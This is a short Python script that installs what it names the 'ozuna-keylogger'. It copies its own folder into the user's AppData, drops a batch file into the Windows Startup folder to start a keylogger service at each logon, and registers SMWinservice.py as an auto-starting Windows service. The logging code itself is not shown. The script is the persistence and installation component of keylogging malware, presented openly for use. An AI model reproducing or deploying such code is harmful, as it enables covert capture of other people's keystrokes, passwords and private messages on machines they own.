
import os
import shutil
import subprocess
from distutils.dir_util import copy_tree

appdatapth = os.getenv('APPDATA')
applicationDir = os.path.join(appdatapth, 'ozuna-keylogger')
startupDirectory = os.path.join(appdatapth, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupBatfilePath = os.path.join(startupDirectory, 'logger.bat')

print('Directory')
print(startupDirectory)

if not os.path.isdir(applicationDir):
    os.makedirs(applicationDir)

destScripLocation = os.path.join(applicationDir, 'SMWinservice.py')
copy_tree(os.path.dirname(os.path.realpath(__file__)), applicationDir)


batScriptContent = """@ECHO OFF
net start ozunaKeyloggerService3
EXIT /B
""".format(destScripLocation)

#if not os.path.isfile(startupBatfilePath):
f = open(startupBatfilePath, 'w')
f.write(batScriptContent)
f.close()
os.system('cmd /k "python \"{0}\" install && python \"{0}\" --startup auto start"'.format(destScripLocation))
